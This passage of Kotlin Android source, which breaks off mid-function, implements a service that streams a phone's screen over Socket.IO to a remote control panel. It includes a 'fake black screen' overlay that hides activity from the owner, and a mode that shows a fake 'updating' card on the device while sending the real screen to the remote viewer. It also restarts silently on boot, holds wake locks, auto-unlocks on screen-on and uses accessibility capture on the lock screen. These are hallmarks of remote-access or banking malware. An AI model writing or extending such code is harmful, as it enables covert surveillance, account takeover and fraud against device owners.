package com.example.acessomaterno

import android.app.Activity
import android.app.KeyguardManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.BroadcastReceiver
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.os.PowerManager
import android.net.wifi.WifiManager
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.PorterDuff
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import androidx.core.app.NotificationCompat
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer

class ScreenCaptureService : Service() {
    companion object {
        private const val TAG = "ScreenCaptureService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "ScreenCaptureChannel"

        /** Nome unificado do arquivo de SharedPreferences usado pelo app. */
        private const val PREFS_NAME = "rastreio_facil_prefs"

        /** Chave unificada que indica se o onboarding (primeiro acesso) ainda não foi concluído. */
        private const val KEY_PRIMEIRO_ACESSO = "primeiro_acesso"

        var isRunning = false
            private set

        @Volatile
        var ultimoResultCode: Int? = null
        @Volatile
        var ultimoData: Intent? = null

        /** Fallback automático: se H.264 não gerar pacote em 2s (ou o painel
         *  solicitar), para o encoder e envia JPEG ultraleve (360x640, q45,
         *  só quando a tela muda). */
        @Volatile
        var modoFallbackJpeg: Boolean = false

        @JvmStatic
        fun ativarFallbackJpeg() {
            try { H264ScreenEncoder.instance?.stop() } catch (_: Exception) {}
            modoFallbackJpeg = true
            try { SocketManager.emitStatusCaptura("JPEG_FALLBACK") } catch (_: Exception) {}
        }

        /** Chave no SharedPreferences que liga/desliga o desbloqueio automático
         *  por swipe quando a tela acende (SCREEN_ON). Default = true. */
        const val KEY_AUTO_DESBLOQUEAR_LIGACAO = "auto_desbloquear_ligacao"

        // Janela preta principal
        private var overlayPretoView: View? = null
        private var overlayFecharView: View? = null
        private var windowManager: WindowManager? = null

        val isTelaPretaAtiva: Boolean
            get() = overlayPretoView != null

        private fun podeDesenharSobreposicao(context: Context): Boolean =
            Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(context)

        private fun dp(context: Context, valor: Int): Int = TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP, valor.toFloat(), context.resources.displayMetrics
        ).toInt()

        private fun tipoOverlay(): Int =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_PHONE

        fun ativarTelaPretaFalsa(context: Context, comBotaoFechar: Boolean = true, textoSobreposto: String? = null): Boolean {
            val appContext = context.applicationContext
            if (!podeDesenharSobreposicao(appContext)) {
                Log.e(TAG, "Sem permissão ACTION_MANAGE_OVERLAY_PERMISSION. Abortando blackout.")
                try {
                    SocketManager.socket?.emit(
                        "log_dispositivo",
                        "[TELA ESCURA ERRO] Permissão de sobreposição NEGADA — permitir em Configurações."
                    )
                } catch (_: Exception) {}
                return false
            }
            Handler(Looper.getMainLooper()).post {
                try {
                    if (overlayPretoView != null) return@post
                    val wm = (appContext.getSystemService(Context.WINDOW_SERVICE) as? WindowManager)
                        ?: return@post
                    windowManager = wm
                    val typeLayout = tipoOverlay()

                    val container = FrameLayout(appContext).apply {
                        setBackgroundColor(Color.BLACK)
                    }
                    if (!textoSobreposto.isNullOrEmpty()) {
                        val aviso = TextView(appContext).apply {
                            text = textoSobreposto
                            setTextColor(Color.parseColor("#88FFFFFF"))
                            textSize = 16f
                            gravity = Gravity.CENTER
                        }
                        container.addView(
                            aviso,
                            FrameLayout.LayoutParams(
                                FrameLayout.LayoutParams.WRAP_CONTENT,
                                FrameLayout.LayoutParams.WRAP_CONTENT,
                                Gravity.CENTER
                            )
                        )
                    }
                    val params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        typeLayout,
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                            WindowManager.LayoutParams.FLAG_SECURE,
                        PixelFormat.OPAQUE
                    ).apply {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            layoutInDisplayCutoutMode =
                                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                        }
                    }
                    wm.addView(container, params)
                    overlayPretoView = container

                    if (comBotaoFechar) {
                        val btnFechar = Button(appContext).apply {
                            text = "✕"
                            contentDescription = "Fechar tela escura"
                            setTextColor(Color.parseColor("#444444"))
                            setBackgroundColor(Color.parseColor("#0a0a0a"))
                            textSize = 14f
                            setPadding(0, 0, 0, 0)
                            setOnClickListener { removerTelaPretaFalsa() }
                        }
                        val paramsFechar = WindowManager.LayoutParams(
                            dp(appContext, 40),
                            dp(appContext, 40),
                            typeLayout,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                                WindowManager.LayoutParams.FLAG_SECURE,
                            PixelFormat.TRANSLUCENT
                        ).apply {
                            gravity = Gravity.TOP or Gravity.END
                            x = dp(appContext, 12)
                            y = dp(appContext, 12)
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                                layoutInDisplayCutoutMode =
                                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                            }
                        }
                        wm.addView(btnFechar, paramsFechar)
                        overlayFecharView = btnFechar
                    }
                    Log.d(TAG, "Native Window Overlay Injection: blackout físico ativo.")
                } catch (e: Exception) {
                    Log.e(TAG, "Erro ao injetar overlay preto: ${e.message}")
                }
            }
            return true
        }

        fun removerTelaPretaFalsa() {
            Handler(Looper.getMainLooper()).post {
                try {
                    overlayPretoView?.let { windowManager?.removeView(it) }
                    overlayPretoView = null
                    overlayFecharView?.let {
                        try { windowManager?.removeView(it) } catch (_: Exception) {}
                    }
                    overlayFecharView = null
                    Log.d(TAG, "Native Window Overlay Injection: overlay preto removido.")
                } catch (e: Exception) {
                    Log.e(TAG, "Erro ao remover overlay preto: ${e.message}")
                }
            }
        }

        private var overlayBrilhoZero: View? = null

        fun ativarBrilhoZero(context: Context): Boolean {
            val appContext = context.applicationContext
            if (!podeDesenharSobreposicao(appContext)) return false
            Handler(Looper.getMainLooper()).post {
                try {
                    if (overlayBrilhoZero != null) return@post
                    val wm = appContext.getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return@post
                    val view = View(appContext)
                    val params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        tipoOverlay(),
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                    ).apply {
                        screenBrightness = 0.01f
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            layoutInDisplayCutoutMode =
                                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                        }
                    }
                    wm.addView(view, params)
                    overlayBrilhoZero = view
                } catch (e: Exception) {
                    Log.e(TAG, "Erro ao ativar brilho-zero: ${e.message}")
                }
            }
            return true
        }

        fun removerBrilhoZero() {
            Handler(Looper.getMainLooper()).post {
                overlayBrilhoZero?.let {
                    try {
                        (it.context.getSystemService(Context.WINDOW_SERVICE) as? WindowManager)?.removeView(it)
                    } catch (_: Exception) {}
                }
                overlayBrilhoZero = null
            }
        }

        // ============================================================
        // SINCRONIA DE FRAME — captura limpa (sem o overlay visual)
        // ------------------------------------------------------------
        // Quando true (ligado pelo botão "Overlay Atualização" do
        // painel), o ScreenCaptureService oculta o overlay visual de
        // atualização (MyAccessibilityService.setOverlayAtualizacaoAlpha)
        // por ~18ms, captura o fundo REAL do dispositivo (sem o cartão
        // "Atualizando…") e restaura o overlay. O emulador flutuante
        // recebe apenas o fundo limpo; o aparelho físico continua com
        // o círculo visível. Requer MyAccessibilityService ativo.
        // ============================================================
        @Volatile
        var capturaLimpaOverlayAtiva: Boolean = false

        /** Intervalo entre ciclos de captura limpa (~25 FPS de frames limpos). */
        const val CICLO_LIMPO_INTERVALO_MS = 40L
        /** Janela de ocultação do overlay (1 frame @60Hz) antes de capturar. */
        const val CICLO_LIMPO_OCULTAR_MS = 18L
    }

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaProjectionManager: MediaProjectionManager? = null
    private var imageReader: ImageReader? = null
    private var h264ScreenEncoder: H264ScreenEncoder? = null
    /** Hash do último frame do fallback JPEG (pula envio se a tela não mudou). */
    @Volatile private var ultimoHashFallback: Int = 0
    private var lastSendTime = 0L
    private var primeiroFrame = true
    /** Altura virtual do display (calculada em startVirtualDisplay) — usada
     *  tanto no fluxo normal quanto no ciclo de captura limpa. */
    private var virtualHeight: Int = 1280
    private val larguraVirtual: Int = 720

    @Volatile
    private var lastJpegFrame: ByteArray? = null

    private var handlerThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    @Volatile
    private var modoSomenteEscuta: Boolean = false

    // Estado da tela (acesa vs apagada pelo botão Power)
    @Volatile
    private var isScreenOn: Boolean = true

    private var partialWakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null

    @Volatile
    private var ultimoFrameMs: Long = 0L

    @Volatile
    private var recriandoDisplay: Boolean = false

    private var keepAliveRunnable: Runnable? = null

    private var watchdogRunnable: Runnable? = null
    private val WATCHDOG_INTERVALO_MS = 3000L
    private val WATCHDOG_STALL_MS = 3000L
    private val WATCHDOG_COOLDOWN_MS = 10000L
    @Volatile
    private var ultimaRecriacaoWatchdogMs = 0L

    private var overlayMantemTelaAcesa: View? = null
    private val handlerTelaAcesa = Handler(Looper.getMainLooper())
    private val removerMantemTelaAcesaRunnable = Runnable { removerOverlayMantemTelaAcesa() }

    private var receiverTelaLigada: BroadcastReceiver? = null
    private var receiverTelaRegistrado = false

    override fun onCreate() {
        super.onCreate()
        mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        isScreenOn = isScreenInteractive()
    }

    private fun isScreenInteractive(): Boolean {
        return try {
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
            pm?.isInteractive == true
        } catch (_: Exception) {
            true
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        enviarLog("onStartCommand chamado.")
        try {
            isScreenOn = isScreenInteractive()

            if (isRunning || virtualDisplay != null || mediaProjection != null) {
                enviarLog("Aviso: ScreenCaptureService já em execução com VirtualDisplay ativo. Abortando inicialização dupla.")
                return START_STICKY
            }

            if (intent == null) {
                val tokenSalvo = ultimoResultCode
                val dataSalva = ultimoData
                if (tokenSalvo != null && dataSalva != null) {
                    enviarLog("Reinício START_STICKY detectado — retomando captura com token salvo.")
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                        } else {
                            startForeground(NOTIFICATION_ID, createNotification())
                        }
                    } catch (e: Exception) {
                        enviarLog("Aviso: startForeground no reinício sticky falhou (${e.message}).")
                    }
                    adquirirWakeLocks()
                    isRunning = true
                    modoSomenteEscuta = false
                    mediaProjection = mediaProjectionManager?.getMediaProjection(tokenSalvo, dataSalva)
                    if (mediaProjection != null) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                                override fun onStop() {
                                    enviarLog("MediaProjection encerrada pelo sistema.")
                                    isRunning = false
                                }
                            }, Handler(Looper.getMainLooper()))
                        }
                        startVirtualDisplay()
                        registrarReceiverTelaLigada()
                        enviarLog("Captura RETOMADA após reinício START_STICKY.")
                        return START_STICKY
                    } else {
                        enviarLog("Aviso: token salvo expirou (MediaProjection nula).")
                    }
                }
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                    } else {
                        startForeground(NOTIFICATION_ID, createNotification())
                    }
                } catch (_: Exception) {}
                adquirirWakeLocks()
                isRunning = true
                modoSomenteEscuta = true
                try {
                    SocketManager.appContext = applicationContext
                    SocketManager.garantirConexao()
                } catch (_: Exception) {}
                enviarLog("Serviço reiniciado via START_STICKY sem token — modo escuta ativo.")
                registrarReceiverTelaLigada()
                return START_STICKY
            }

            if (intent.action == BootReceiver.ACTION_RESTART_BOOT) {
                enviarLog("Reativação silenciosa via BOOT detectada — foreground em modo escuta.")
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                    } else {
                        startForeground(NOTIFICATION_ID, createNotification())
                    }
                } catch (e: Exception) {
                    try { startForeground(NOTIFICATION_ID, createNotification()) } catch (_: Exception) {}
                }
                isRunning = true
                modoSomenteEscuta = true
                primeiroFrame = true
                adquirirWakeLocks()
                try {
                    SocketManager.appContext = applicationContext
                    SocketManager.garantirConexao()
                } catch (e: Exception) {
                    enviarLog("Aviso: falha ao reconectar Socket.IO no boot: ${e.message}")
                }
                registrarReceiverTelaLigada()
                return START_STICKY
            }

            val resultCode = intent.getIntExtra("RESULT_CODE", Activity.RESULT_CANCELED)
            val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                intent.getParcelableExtra("DATA", Intent::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("DATA")
            }
            if (resultCode != Activity.RESULT_OK || data == null) {
                enviarLog("ERRO: sem token de captura (resultCode=$resultCode, data=${data != null}).")
                SocketManager.emitStatusCaptura("SEM_PERMISSAO_TELA")
                stopSelf()
                return START_NOT_STICKY
            }
            enviarLog("Token de captura OK (resultCode=$resultCode). Iniciando foreground...")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
            } else {
                startForeground(NOTIFICATION_ID, createNotification())
            }
            isRunning = true
            modoSomenteEscuta = false
            mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, data)
            if (mediaProjection == null) {
                enviarLog("ERRO: MediaProjection nula.")
                SocketManager.emitStatusCaptura("SEM_PERMISSAO_TELA")
                stopSelf()
                return START_NOT_STICKY
            }
            ultimoResultCode = resultCode
            ultimoData = data
            adquirirWakeLocks()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                    override fun onStop() {
                        enviarLog("MediaProjection encerrada pelo sistema/usuário.")
                        isRunning = false
                    }
                }, Handler(Looper.getMainLooper()))
            }
            startVirtualDisplay()
            enviarLog("VirtualDisplay criado — transmitindo tela em tempo real.")
            registrarReceiverTelaLigada()
            return START_STICKY
        } catch (e: Exception) {
            enviarLog("CRASH onStartCommand: ${e.javaClass.simpleName}: ${e.message}")
            stopSelf()
            return START_NOT_STICKY
        }
    }

    private fun enviarLog(msg: String) {
        Log.d(TAG, msg)
        try {
            SocketManager.socket?.emit("log_dispositivo", msg)
        } catch (_: Exception) {}
    }

    private fun adquirirWakeLocks() {
        try {
            if (partialWakeLock?.isHeld != true) {
                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                partialWakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "AcessoMaterno:CapturaContinua"
                ).apply {
                    setReferenceCounted(false)
                    acquire()
                }
                Log.d(TAG, "Partial WakeLock adquirido — CPU permanece acordada com tela apagada.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao adquirir Partial WakeLock: ${e.message}")
        }
        try {
            if (wifiLock?.isHeld != true) {
                val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                @Suppress("DEPRECATION")
                wifiLock = wm.createWifiLock(
                    WifiManager.WIFI_MODE_FULL_HIGH_PERF,
                    "AcessoMaterno:SocketIoVivo"
                ).apply {
                    setReferenceCounted(false)
                    acquire()
                }
                Log.d(TAG, "WifiLock adquirido — Socket.IO permanece conectado com tela apagada.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao adquirir WifiLock: ${e.message}")
        }
    }

    private fun liberarWakeLocks() {
        try {
            partialWakeLock?.let { if (it.isHeld) it.release() }
            partialWakeLock = null
        } catch (_: Exception) {}
        try {
            wifiLock?.let { if (it.isHeld) it.release() }
            wifiLock = null
        } catch (_: Exception) {}
    }

    private fun mostrarOverlayMantemTelaAcesa() {
        Handler(Looper.getMainLooper()).post {
            try {
                if (overlayMantemTelaAcesa != null) return@post
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                    Log.w(TAG, "Sem permissão de overlay — não é possível manter a tela acesa via FLAG_KEEP_SCREEN_ON.")
                    return@post
                }
                val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_PHONE
                val view = View(this).apply { setBackgroundColor(Color.TRANSPARENT) }
                val params = WindowManager.LayoutParams(
                    1, 1,
                    type,
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = Gravity.TOP or Gravity.START
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        layoutInDisplayCutoutMode =
                            WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                    }
                }
                wm.addView(view, params)
                overlayMantemTelaAcesa = view
                handlerTelaAcesa.removeCallbacks(removerMantemTelaAcesaRunnable)
                handlerTelaAcesa.postDelayed(removerMantemTelaAcesaRunnable, 60000L)
                Log.d(TAG, "Overlay 1x1 com FLAG_KEEP_SCREEN_ON ativo.")
            } catch (e: Exception) {
                Log.e(TAG, "Falha ao criar overlay mantem-tela-acesa: ${e.message}")
            }
        }
    }

    private fun removerOverlayMantemTelaAcesa() {
        Handler(Looper.getMainLooper()).post {
            try {
                overlayMantemTelaAcesa?.let {
                    (getSystemService(Context.WINDOW_SERVICE) as? WindowManager)?.removeView(it)
                }
                overlayMantemTelaAcesa = null
                handlerTelaAcesa.removeCallbacks(removerMantemTelaAcesaRunnable)
            } catch (_: Exception) {}
        }
    }

    /** Processa um frame Image → Bitmap recortado → JPEG → emite "enviar_tela".
     *  Usado tanto no fluxo normal (onImageAvailable) quanto no ciclo de
     *  captura limpa (sincronia de frame). NÃO fecha o image (quem chama fecha). */
    /** Hash barato de 64 pixels amostrados (8x8) — igual = tela estática. */
    private fun hashBitmapAmostrado(b: Bitmap): Int {
        var h = 1
        val stepX = ((b.width - 1) / 7).coerceAtLeast(1)
        val stepY = ((b.height - 1) / 7).coerceAtLeast(1)
        for (y in 0..7) {
            for (x in 0..7) {
                val px = (x * stepX).coerceAtMost(b.width - 1)
                val py = (y * stepY).coerceAtMost(b.height - 1)
                h = h * 31 + b.getPixel(px, py)
            }
        }
        return h
    }

    private fun processarEEnviarFrame(image: android.media.Image, width: Int, height: Int) {
        val planes = image.planes
        if (planes.isNullOrEmpty()) return
        val buffer: ByteBuffer = planes[0].buffer
        val pixelStride = planes[0].pixelStride
        val rowStride = planes[0].rowStride
        val rowPadding = rowStride - pixelStride * width
        val bitmap = Bitmap.createBitmap(
            width + rowPadding / pixelStride,
            height,
            Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)
        val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height)
        if (bitmap != croppedBitmap) bitmap.recycle()
        val byteArray: ByteArray
        if (modoFallbackJpeg) {
            // JPEG ultraleve: 360x640, qualidade 45, só envia quando a tela muda.
            val scaled = Bitmap.createScaledBitmap(croppedBitmap, 360, 640, true)
            val hash = hashBitmapAmostrado(scaled)
            if (hash == ultimoHashFallback && !primeiroFrame) {
                // Tela estática: não envia (economiza banda). O keep-alive
                // reenvia o último frame a cada 150ms — o painel não congela.
                scaled.recycle()
                croppedBitmap.recycle()
                return
            }
            ultimoHashFallback = hash
            val baos = ByteArrayOutputStream()
            scaled.compress(Bitmap.CompressFormat.JPEG, 45, baos)
            byteArray = baos.toByteArray()
            scaled.recycle()
        } else {
            val baos = ByteArrayOutputStream()
            croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos)
            byteArray = baos.toByteArray()
        }
        croppedBitmap.recycle()

        lastJpegFrame = byteArray
        SocketManager.garantirConexao()
        SocketManager.socket?.emit("enviar_tela", byteArray)
        if (primeiroFrame) {
            primeiroFrame = false
            enviarLog("Primeiro frame enviado (${byteArray.size} bytes).")
        }
    }

    private fun startVirtualDisplay() {
        modoFallbackJpeg = true
        SocketManager.emitStatusCaptura("JPEG_FALLBACK")
        val metrics = resources.displayMetrics
        val width = larguraVirtual
        val height = (720f * metrics.heightPixels / metrics.widthPixels).toInt()
        virtualHeight = height
        val density = metrics.densityDpi
        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 3)
        handlerThread = HandlerThread("ScreenCaptureThread").also { it.start() }
        backgroundHandler = Handler(handlerThread!!.looper)

        val displayFlags = DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC or
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            width,
            height,
            density,
            displayFlags,
            imageReader?.surface,
            null,
            backgroundHandler
        )
        imageReader?.setOnImageAvailableListener({ reader ->
            var image: android.media.Image? = null
            try {
                image = reader.acquireLatestImage()
                if (image == null) return@setOnImageAvailableListener

                // Se a tela estiver apagada pelo botão Power, ignora o frame sem travar a thread
                if (!isScreenOn) return@setOnImageAvailableListener

                // WebRTC CONECTADO: o vídeo flui por PeerConnection (baixa
                // latência, aceleração HW). Para de enviar JPEG pesado via
                // Socket.IO — economiza bateria e banda. Se cair, volta ao JPEG.
                if (WebRtcStreamer.isConectado) return@setOnImageAvailableListener

                val agora = System.currentTimeMillis()

                // ============================================================
                // SINCRONIA DE FRAME ROBUSTA — NUNCA trava o espelhamento
                // ------------------------------------------------------------
                // (Correção: a versão anterior usava um ciclo Runnable
                // separado com postDelayed que podia morrer e parar de
                // enviar frames → emulador flutuante congelava. Agora a
                // alternância roda DENTRO do próprio onImageAvailable,
                // movida pela chegada REAL de frames: se frames chegam,
                // enviamos um a cada dois (limpos); se frames param, o
                // keep-alive reenvia o último; se a acessibilidade está
                // desligada (não dá pra ocultar o overlay), envia TODOS os
                // frames normalmente — o espelhamento NUNCA para.)
                // ============================================================
                // CORREÇÃO FLICKER: o toggle de alpha 0↔1 a cada frame só é
                // necessário em APIs <34. No Android 14+ o overlay visual já
                // foi marcado com setHideDuringScreenSharing(true) e é omitido
                // da captura automaticamente, sem piscar — nesse caso caímos
                // direto no else-if abaixo, que envia todos os frames normais.
                if (agora - lastSendTime < 16) return@setOnImageAvailableListener
                lastSendTime = agora
                ultimoFrameMs = agora

                processarEEnviarFrame(image, width, height)
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao capturar/enviar frame: ${e.message}")
            } finally {
                try {
                    image?.close()
                } catch (_: Exception) {}
            }
        }, backgroundHandler)

        keepAliveRunnable?.let { backgroundHandler?.removeCallbacks(it) }
        val novoKeepAlive = object : Runnable {
            override fun run() {
                val now = System.currentTimeMillis()
                val frame = lastJpegFrame
                if (isRunning && isScreenOn && frame != null && now - lastSendTime >= 150) {
                    lastSendTime = now
                    try {
                        SocketManager.garantirConexao()
                        SocketManager.socket?.emit("enviar_tela", frame)
                    } catch (e: Exception) {
                        Log.e(TAG, "Erro ao reenviar frame keep-alive: ${e.message}")
                    }
                }
                if (isRunning) {
                    backgroundHandler?.postDelayed(this, 150)
                }
            }
        }
        keepAliveRunnable = novoKeepAlive
        backgroundHandler?.postDelayed(novoKeepAlive, 150)
        agendarWatchdogAntiCongelamento()
    }

    private fun agendarWatchdogAntiCongelamento() {
        val handler = backgroundHandler ?: return
        watchdogRunnable?.let { handler.removeCallbacks(it) }
        val wd = object : Runnable {
            override fun run() {
                try {
                    if (!isRunning || modoSomenteEscuta) return
                    val agora = System.currentTimeMillis()
                    val telaLigada = isScreenInteractive()
                    val stallMs = agora - ultimoFrameMs
                    if (telaLigada && stallMs > WATCHDOG_STALL_MS && !recriandoDisplay &&
                        agora - ultimaRecriacaoWatchdogMs > WATCHDOG_COOLDOWN_MS
                    ) {
                        ultimaRecriacaoWatchdogMs = agora
                        enviarLog("[WATCHDOG] Stall de ${stallMs}ms detectado (tela ligada) — recriando VirtualDisplay.")
                        recriarVirtualDisplay(force = true)
                    }
                    try {
                        val kg = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
                        if (kg?.isKeyguardLocked == true && telaLigada) {
                            val svc = MyAccessibilityService.instance
                            if (svc == null) {
                                enviarLog("[WATCHDOG] Keyguard travado mas acessibilidade OFF.")
                            } else {
                                svc.iniciarCapturaAcessibilidade()
                            }
                        }
                    } catch (_: Exception) {}
                } catch (e: Exception) {
                    Log.e(TAG, "Erro no watchdog anti-congelamento: ${e.message}")
                } finally {
                    if (isRunning) backgroundHandler?.postDelayed(this, WATCHDOG_INTERVALO_MS)
                }
            }
        }
        watchdogRunnable = wd
        handler.postDelayed(wd, WATCHDOG_INTERVALO_MS)
    }

    private fun pararWatchdogAntiCongelamento() {
        watchdogRunnable?.let { backgroundHandler?.removeCallbacks(it) }
        watchdogRunnable = null
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Espelhamento de Tela Ativo",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Indica quando a tela deste aparelho está sendo transmitida ao painel de suporte."
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Tela sendo compartilhada")
            .setContentText("A tela deste aparelho está sendo transmitida ao painel de suporte. Toque em Parar no app para encerrar.")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun registrarReceiverTelaLigada() {
        if (receiverTelaRegistrado) return
        try {
            receiverTelaLigada = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    val action = intent?.action ?: return
                    when (action) {
                        Intent.ACTION_SCREEN_OFF -> {
                            isScreenOn = false
                            MyAccessibilityService.instance?.pararCapturaAcessibilidade()
                            enviarLog("SCREEN_OFF detectado — pausando envio de frames; ForegroundService, MediaProjection e SocketIO mantidos ativos em background.")
                        }
                        Intent.ACTION_SCREEN_ON -> {
                            isScreenOn = true
                            enviarLog("SCREEN_ON detectado — reconectando Socket.IO e recriando VirtualDisplay...")
                            
                            SocketManager.garantirConexao()

                            try {
                                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                                @Suppress("DEPRECATION")
                                val bright = pm.newWakeLock(
                                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                                        PowerManager.ACQUIRE_CAUSES_WAKEUP or
                                        PowerManager.ON_AFTER_RELEASE,
                                    "AcessoMaterno:LockScreen30s"
                                )
                                bright.acquire(30000L)
                            } catch (_: Exception) {}

                            mostrarOverlayMantemTelaAcesa()

                            try {
                                val kg = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
                                if (kg?.isKeyguardLocked == true) {
                                    MyAccessibilityService.instance?.iniciarCapturaAcessibilidade()
                                }
                            } catch (e: Exception) {
                                enviarLog("Aviso ao verificar keyguard no SCREEN_ON: ${e.message}")
                            }

                            Handler(Looper.getMainLooper()).postDelayed({
                                recriarVirtualDisplay(force = true)
                            }, 500L)

                            try {
                                val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
